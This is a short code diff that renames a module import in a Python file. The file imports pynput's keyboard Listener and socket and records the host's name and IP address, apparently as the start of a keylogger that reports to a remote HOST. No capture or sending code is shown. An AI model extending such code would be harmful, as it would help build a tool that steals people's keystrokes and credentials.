@@ -1,7 +1,7 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import socket
-from ClientConnections import HOST
+from connections import HOST
 
 hostname = socket.gethostname()
 ip = socket.gethostbyname(hostname)
